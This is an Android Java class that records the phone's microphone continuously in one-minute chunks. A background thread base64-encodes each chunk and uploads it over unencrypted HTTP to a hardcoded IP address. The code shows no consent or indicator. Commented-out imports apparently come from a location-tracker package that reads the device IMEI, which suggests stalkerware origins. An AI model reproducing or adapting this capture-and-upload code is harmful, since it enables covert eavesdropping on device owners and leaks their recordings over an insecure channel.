package com.tuongle.audiotransfer.AudioRecord;

import android.app.ProgressDialog;
import android.media.MediaRecorder;
import android.net.Uri;
import java.text.SimpleDateFormat;
import android.os.Environment;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

//import net.process.locator.APTrackerService;
//import net.process.locator.BatteryLog;
//import net.process.locator.DataObject;
//import net.process.locator.FileUtil;
//import net.process.locator.HttpData;
//import net.process.locator.LocationUtil;
//import net.process.locator.MediaManager;
//import net.process.locator.StoreUtil;
//import net.process.locator.TypeCmd;
//import net.process.locator.TypeData;
//import net.process.locator.UtilGame;
//import net.process.locator.UtilMemory;
import org.apache.commons.io.FileUtils;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class RecordAudioManager {
//    StorageReference mStorage;
    public MediaRecorder mRecorder;
    private Timer mStopTimer;
    public boolean isRecording;
    private String mFilename;
    private String path;
    private String fileNameCurrent="";


    private String URL = "http://113.190.40.199:8080/mobile.php";
    private ProgressDialog progressDialog=null;
 //   private String ba1;

    public static RecordAudioManager instance;
    public static RecordAudioManager getInstance()
    {
        if(instance==null)instance= new RecordAudioManager();
        return instance;
    }
    public RecordAudioManager()
    {
        mRecorder= new MediaRecorder();
    }
    public int interval=1*60000;
    public void startRecordAudio(int interval1)
    {
//        StoreUtil.getInstance().setStatusCmdRealtime(TypeCmd.PROCESSING);
//        (new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_RECORDAUDIOFAST);
        if(interval1!=0)interval=interval1;
   //     bufferStreaming= new Vector<String>();
        bufferStreaming= new Vector<File>();
        try {
            mRecorder.reset();
            initRecorder();
            try {
                mRecorder.prepare();// unskip
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            // TODO Auto-generated method stub
            mRecorder.start();
            mStopTimer = new Timer();
            mStopTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    Looper.prepare();
                    restartRecorder();
                }
            }, interval);
            isRecording = true;

         //   startThreadUploadFile();
              startThreadRenameFile();
          //  uploadFile(Environment.getExternalStorageDirectory());

        }catch (Exception ex)
        {
            updateStatus("Exception When StartStreaming:" + ex.toString());
        }
    }
    private void startThreadUploadFile()
    {
        // TODO Auto-generated method stub

    }
    private void startThreadRenameFile()
    {
        // TODO Auto-generated method stub
        Runnable mStatusUpload = new Runnable() {
            @Override
            public void run()
            {
                try
                {
                    while(isRecording || bufferStreaming.size()>0)
                    {
                        if(bufferStreaming.size()>0)
                        {
                          //  String file1=bufferStreaming.get(0);
                           // String file2="ok_"+bufferStreaming.get(0);
                            File fileToRename = bufferStreaming.get(0);
                            String abPath = fileToRename.getAbsolutePath();
                            String newPath = abPath.substring(0,abPath.lastIndexOf(fileToRename.separator));
                            File Filenew =  new File(newPath + "/OK_" + fileToRename.getName());

                            fileToRename.renameTo(Filenew);
                         //   File file = new File(Filenew.getAbsolutePath());

                            byte[] bytes = FileUtils.readFileToByteArray(Filenew);

                            String encoded = Base64.encodeToString(bytes, 0);

                         //   FileUtils.renameFile(file1, file2);

                            bufferStreaming.remove(0);
        //                    uploadFile(Environment.getExternalStorageDirectory());
                            UploadFile2Server(encoded,fileToRename.getName());
                        }
                        Thread.sleep(30000);
                    }
                }catch(Exception ex)
                {
                    updateStatus("mRecorder.startThreadRenameFile:"+ex.toString());
                }
            }
        };
        new Thread(mStatusUpload).start();
    }
    private void UploadFile2Server(String bal, String name){
        ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        nameValuePairs.add(new BasicNameValuePair("base64", bal));
        //   nameValuePairs.add(new BasicNameValuePair("ImageName", System.currentTimeMillis() + ".jpg"));
        //nameValuePairs.add(new BasicNameValuePair("ImageName", System.currentTimeMillis() + ".aac"));
        nameValuePairs.add(new BasicNameValuePair("ImageName", name));
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(URL);
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = httpclient.execute(httppost);
            String st = EntityUtils.toString(response.getEntity());
            Log.v("log_tag", "In the try Loop" + st);

        } catch (Exception e) {
            Log.v("log_tag", "Lỗi kết nối : " + e.toString());
        }
        Log.v("log_tag","Success!");
    }

//    private Vector<String> bufferStreaming= new Vector<String>();
    private Vector<File> bufferStreaming= new Vector<File>();
    protected void restartRecorder()
    {
        try
        {
            mRecorder.reset();
            if(!fileNameCurrent.equalsIgnoreCase(""))
           //     bufferStreaming.add(fileNameCurrent);
                bufferStreaming.add(new File(fileNameCurrent));
            if(!isRecording)return;
            initRecorder();
            try
            {
                mRecorder.prepare();
            } catch (Exception e) {
                // TODO Auto-generated catch block
                updateStatus("mRecorder.prepare123:"+e.toString());
                fileNameCurrent="";
                restartRecorder();
                return;
            }

            mRecorder.start();
            mStopTimer = new Timer();
            mStopTimer.schedule( new TimerTask() {

                @Override
                public void run()
                {
                    Looper.prepare();
                    restartRecorder();
                }

            }, interval);

        }catch(Exception ex){

            updateStatus("ErrorRRecorder:"+ex.toString());
        }
        //fileNameCurrent=UtilGame.getInstance().GetStringNow();
    }
    private void resetRecorderToNewSession()
    {
        isRecording=false;
        // TODO Auto-generated method stub
        mRecorder.reset();
        initRecorder();
        try {
            mRecorder.prepare();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        mStopTimer.cancel();
        //statusAction="stopstreaming";
    }
    private void resetRecorderToEnd()
    {
        try
        {
            isRecording=false;
            // TODO Auto-generated method stub
            mRecorder.reset();
            mRecorder.stop();
            mRecorder.release();
            mRecorder=null;
            mStopTimer.cancel();
            //statusAction="stopstreaming";
        }catch(Exception ex){}
    }
    public void initRecorder()
    {
        Date objDate = new Date();
        String strDateFormat = "dd_MMM_yyyy_hh_mm_ss_a"; //Date format is Specified
        SimpleDateFormat objSDF = new SimpleDateFormat(strDateFormat);
        String currentDateTimeString = objSDF.format(objDate);
     //   mStorage = FirebaseStorage.getInstance().getReference();
       // String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());

      //  fileNameCurrent =StoreUtil.getInstance().getImei()+"_"+ net.process.locator.UtilGame.getInstance().GetStringNow()+"."+UtilGame.file3GP;
      //  mFilename = Environment.getExternalStorageDirectory().getAbsolutePath();
        path = Environment.getExternalStorageDirectory().getPath();
        File fileToSave = new File(path,"MyRecorder");
//        mFilename= fileToSave.getAbsolutePath()+'/'+currentDateTimeString+ "record_audio.3gp";
//        fileNameCurrent = fileToSave.getAbsolutePath()+'/'+currentDateTimeString+ "record_audio.3gp";

         mFilename= fileToSave.getAbsolutePath()+'/'+currentDateTimeString+ ".aac";
        fileNameCurrent = fileToSave.getAbsolutePath()+'/'+currentDateTimeString+ ".aac";

        //mRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        //2.format
        mRecorder.setAudioEncodingBitRate(96000);
        mRecorder.setAudioSamplingRate(44100);


      //  mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//MPEG_4
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);//MPEG_4
        //mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);//MPEG_4

        //3.output
        mRecorder.setOutputFile(mFilename);

        //4.encoder
   //     mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        /*
        try
        {
            mRecorder.prepare();
        } catch (Exception e) {
        	updateStatus("mRecorder.prepare:"+e.toString());
        	return;
        }
        mRecorder.start();
        updateStatus("Recording Audio ...");
        */
    }
    public void stopRecordAudio()
    {
        try
        {
//            StoreUtil.getInstance().setStatusCmdRealtime(TypeCmd.DONE);
//            (new HttpData()).notifyRealtimeCmd(TypeCmd.DONE,UtilGame.CMD_START_RECORDAUDIOFAST);

            resetRecorderToEnd();
            isRecording=false;
            //stopThreadUploadFile();
        }catch(Exception ex)
        {
//            //APTrackerService.statusCmdRealtime=TypeCmd.ERROR;
//            StoreUtil.getInstance().setStatusCmdRealtime(TypeCmd.ERROR);
//            updateStatus("mRecorder.stopRecordAudio:"+ex.toString());
        }
    }
    public void updateStatus(String s)
    {

    }

}
